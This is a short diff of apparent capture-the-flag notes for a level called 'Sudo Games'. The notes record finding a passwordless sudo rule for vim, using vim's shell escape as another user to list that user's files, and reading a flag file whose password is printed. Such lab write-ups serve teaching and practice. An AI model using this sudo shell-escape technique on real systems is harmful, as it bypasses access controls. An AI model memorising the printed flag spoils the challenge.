@@ -3,4 +3,9 @@
 
 goal: find password for phantom3
 
+cat ~/BRIEFING: Sudo Games
+sudo -l: (flagkeeper2) NOPASSWD: /usr/bin/vim
+sudo -u flagkeeper2 vim -Es +'!find / -user flagkeeper2 -type f 2>/dev/null > /tmp/fk2_files' +q; tail -n 20 /tmp/fk2_files
+/var/lib/phantom-flags/level2_flag
+
 sudo -u flagkeeper2 vim -Es +'!cat /var/lib/phantom-flags/level2_flag > /tmp/p3pass' +q; cat /tmp/p3pass: bl_phtm2_8aa5b04cdb337f6c
